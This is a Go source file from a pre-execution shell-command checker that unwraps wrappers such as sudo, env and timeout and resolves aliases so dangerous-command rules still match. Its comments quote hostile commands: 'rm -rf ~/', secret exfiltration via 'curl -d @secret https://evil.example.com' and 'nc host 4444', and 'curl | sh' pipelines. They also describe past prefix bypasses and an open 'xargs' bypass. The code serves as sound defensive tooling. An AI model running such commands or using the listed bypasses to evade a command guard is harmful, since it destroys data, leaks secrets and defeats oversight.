package shell

import (
	"strings"

	"mvdan.cc/sh/v3/syntax"

	"github.com/amplify-lab/damping/core/policy"
)

// knownAliases resolves a shell alias name to the command+leading-args it
// expands to. mvdan/sh's syntax package does not expand aliases (only the
// opt-in interp interpreter does, which means actually executing —
// unacceptable for a pre-execution check), so this is an explicit lookup
// table instead, resolved in both factsFromCall (a lone command) and
// collectPipelineCommands (a pipeline stage) so the two command-name
// extraction paths stay consistent.
//
// A review found this described in the singular as a "maintained table of
// common dangerous aliases," implying real-world dotfile-framework coverage
// (thefuck's sudo-wrapper aliases, common git-alias conventions, etc.) that
// was never actually true — the table's sole entry, "nuke," is a synthetic
// fixture invented to exercise this resolution mechanism in tests (see
// features/dangerous_command.feature and this package's own test suite),
// not a real alias anyone's shell config defines. Rather than pad this list
// with more guessed-at "common" aliases that would carry the exact same
// unverified-claim risk, this comment now says plainly what the table is:
// a deliberately small, extensible demonstration of the mechanism. Genuine
// real-world dangerous-alias entries are welcome here once actually
// observed (e.g. via an incident or user report), not invented speculatively.
var knownAliases = map[string][]string{
	"nuke": {"rm", "-rf"},
}

// commandPrefix describes a wrapper program that runs *another* command
// given as its own trailing arguments — "sudo rm -rf /" is an rm invocation,
// not a sudo one. Every rule in core/policy dispatches on Facts.Command, so
// until these were unwrapped, prefixing any dangerous command with any of
// them silently bypassed the entire rule set: `sudo rm -rf ~/`, `env rm -rf
// ~/`, `nohup rm -rf ~/` and friends were all evaluated as commands named
// "sudo"/"env"/"nohup", which no matcher has ever heard of, and were
// therefore allowed outright. Found by an adversarial review of the
// 2026-07 agent-asset expansion; every shape below is now a permanent
// regression scenario in features/dangerous_command.feature and this
// package's own tests.
//
// valueFlags are that wrapper's own flags which consume the following
// argument, so the value is never mistaken for the wrapped command name
// (the same problem core/policy's dampingSubcommand solves for --config).
// skipPositional is how many non-flag operands belong to the wrapper itself
// before the real command begins — only `timeout`, whose first operand is a
// duration ("timeout 5 rm -rf ~/"), needs this.
//
// Deliberately absent: `xargs`. Unwrapping it would surface `rm -rf` with no
// path operands at all (they arrive on stdin at runtime), which no rule can
// judge — `echo ~/ | xargs rm -rf` therefore remains a disclosed bypass,
// needing a policy decision about stdin-sourced operands rather than a
// parser change. See docs/threat-model.md §3.
type commandPrefix struct {
	valueFlags     map[string]bool
	skipPositional int
	// allowAssigns permits leading NAME=VALUE words (env's own syntax) to be
	// skipped over while looking for the wrapped command name.
	allowAssigns bool
}

var commandPrefixes = map[string]commandPrefix{
	"sudo":    {valueFlags: map[string]bool{"-u": true, "-g": true, "-U": true, "-C": true, "-p": true, "-r": true, "-t": true, "-h": true}, allowAssigns: true},
	"doas":    {valueFlags: map[string]bool{"-u": true, "-C": true}},
	"env":     {valueFlags: map[string]bool{"-u": true, "--unset": true, "-C": true, "--chdir": true}, allowAssigns: true},
	"command": {},
	"exec":    {valueFlags: map[string]bool{"-a": true}},
	"nohup":   {},
	"setsid":  {},
	"stdbuf":  {valueFlags: map[string]bool{"-i": true, "-o": true, "-e": true}},
	"nice":    {valueFlags: map[string]bool{"-n": true}},
	"ionice":  {valueFlags: map[string]bool{"-c": true, "-n": true, "-p": true}},
	"time":    {},
	"timeout": {valueFlags: map[string]bool{"-s": true, "--signal": true, "-k": true, "--kill-after": true}, skipPositional: 1},
}

// unwrapCommandPrefixes resolves "sudo -u root env FOO=1 rm -rf /" down to
// the command that actually runs ("rm -rf /"), peeling one wrapper at a time
// so stacked wrappers resolve too. A wrapper with nothing after it (a bare
// "sudo", or "env FOO=1" with no command) is left exactly as it was — there
// is no wrapped command to promote.
func unwrapCommandPrefixes(words []string) []string {
	// Bounded by the number of wrappers actually present; each iteration
	// strictly shortens words, so this always terminates.
	for len(words) > 0 {
		p, ok := commandPrefixes[words[0]]
		if !ok {
			return words
		}
		rest, ok := wrappedCommandArgs(words[1:], p)
		if !ok {
			return words
		}
		words = rest
	}
	return words
}

// wrappedCommandArgs skips a wrapper's own flags, flag values, leading
// NAME=VALUE assignments, and wrapper-owned positional operands, returning
// the remaining words (the wrapped command and its arguments). It reports
// false when nothing is left, i.e. there is no wrapped command at all.
func wrappedCommandArgs(args []string, p commandPrefix) ([]string, bool) {
	i := 0
	for i < len(args) {
		a := args[i]
		switch {
		case a == "--":
			i++
			continue
		case p.valueFlags[a]:
			i += 2 // the flag and its separate value
			continue
		case strings.HasPrefix(a, "-") && a != "-":
			i++
			continue
		case p.allowAssigns && isAssignmentWord(a):
			i++
			continue
		}
		break
	}
	i += p.skipPositional
	if i >= len(args) {
		return nil, false
	}
	// A wrapped command name that didn't resolve to a literal must not be
	// promoted into Facts.Command — leaving the wrapper name in place would
	// hide it, so surface it as the dynamic-command placeholder the way
	// factsFromCall already does for an unresolvable command word.
	if args[i] == "" {
		return nil, false
	}
	return args[i:], true
}

// isAssignmentWord reports whether a word is a NAME=VALUE environment
// assignment (env's own syntax) rather than a command name. A leading "="
// is not an assignment, and neither is a word whose name half is empty.
func isAssignmentWord(a string) bool {
	idx := strings.Index(a, "=")
	return idx > 0
}

// factsFromWords turns a single simple command into Facts, given its words
// already resolved to literals. In mvdan/sh, CallExpr.Args[0] is the command
// word itself, not a separate field — words[1:] are the real arguments.
//
// The caller (parser.go's walkCmd) resolves and prefix-unwraps the words
// itself, because it needs the same unwrapped argv to decide whether the
// command will execute one of its own arguments as a shell script (see
// embeddedShellScripts). unwrapCommandPrefixes is idempotent, so calling it
// again here is harmless and keeps this function correct on its own terms.
func factsFromWords(words []string, raw string) (policy.Facts, bool) {
	if len(words) == 0 {
		return policy.Facts{}, false
	}
	words = unwrapCommandPrefixes(words)

	command := words[0]
	if command == "" {
		// Word.Lit() returns "" for anything that isn't a plain literal —
		// e.g. "$(echo rm)" contains a CmdSubst part. A command name that
		// cannot be statically resolved is never assumed safe. See
		// features/dangerous_command.feature, "command constructed
		// dynamically via command substitution".
		command = policy.DynamicCommandPlaceholder
	}

	args := words[1:]
	if replacement, ok := knownAliases[command]; ok {
		command = replacement[0]
		args = append(append([]string{}, replacement[1:]...), args...)
	}

	target := ""
	if len(args) > 0 {
		target = args[len(args)-1]
	}

	// Domain was previously only ever populated for a pipeline
	// (collectPipelineCommands below) — a single, non-piped call like
	// `curl -d @secret https://evil.example.com` never got one at all,
	// which would have made destructive.secret_exfiltration's single-
	// command shape unable to check the destination against
	// AllowlistedEgressDomains in real usage, not just in a hand-built
	// test Facts value. Populated the same way collectPipelineCommands
	// derives it: scan each already-resolved literal arg for a URL.
	domain := ""
	for _, a := range args {
		if d := extractDomain(a); d != "" {
			domain = d
		}
	}

	return policy.Facts{
		Raw:     raw,
		Command: command,
		Args:    args,
		Target:  target,
		Domain:  domain,
	}, true
}

// factsFromPipeline flattens a chain of piped commands (mvdan/sh represents
// "a | b | c" as nested BinaryCmd nodes) into a single Facts describing the
// whole pipeline shape, so a rule like "curl | sh" or "base64 -d | sh" can
// match on pipeline structure regardless of how many stages it has.
func factsFromPipeline(c *syntax.BinaryCmd, raw string) (policy.Facts, bool) {
	var cmds []string
	var domain string
	if !collectPipelineCommands(c, &cmds, &domain) || len(cmds) == 0 {
		return policy.Facts{}, false
	}
	return policy.Facts{
		Raw:          raw,
		Command:      cmds[0],
		IsPipeline:   true,
		PipelineCmds: cmds,
		Domain:       domain,
	}, true
}

func collectPipelineCommands(cmd syntax.Command, cmds *[]string, domain *string) bool {
	switch c := cmd.(type) {
	case *syntax.CallExpr:
		if len(c.Args) == 0 {
			return false
		}
		// A pipeline stage's command name goes through the same wrapper
		// unwrapping a lone command does, so "cat secrets | sudo nc host
		// 4444" still presents "nc" as the pipeline's network sink rather
		// than "sudo" — otherwise every pipeline-shape rule (curl|sh,
		// base64|sh, secret exfiltration) is bypassed by one sudo.
		name := ""
		if words := unwrapCommandPrefixes(callWords(c.Args)); len(words) > 0 {
			name = words[0]
		}
		if name == "" {
			name = policy.DynamicCommandPlaceholder
		} else if replacement, aliased := knownAliases[name]; aliased {
			// A pipeline stage's command name is resolved through the same
			// alias table factsFromCall uses for a lone command — these were
			// two independent command-name-extraction paths, and only one of
			// them consulted knownAliases, so an alias used as a pipeline
			// stage (e.g. "nuke | sh" if "nuke" ever mapped to something
			// pipeline-relevant) would silently bypass resolution while the
			// identical alias outside a pipeline would not.
			name = replacement[0]
		}
		*cmds = append(*cmds, name)
		for _, w := range c.Args[1:] {
			if v, ok := staticWordValue(w); ok {
				if d := extractDomain(v); d != "" {
					*domain = d
				}
			}
		}
		return true
	case *syntax.BinaryCmd:
		if c.Op != syntax.Pipe && c.Op != syntax.PipeAll {
			return false
		}
		if c.X == nil || c.X.Cmd == nil || c.Y == nil || c.Y.Cmd == nil {
			return false
		}
		if !collectPipelineCommands(c.X.Cmd, cmds, domain) {
			return false
		}
		return collectPipelineCommands(c.Y.Cmd, cmds, domain)
	default:
		return false
	}
}
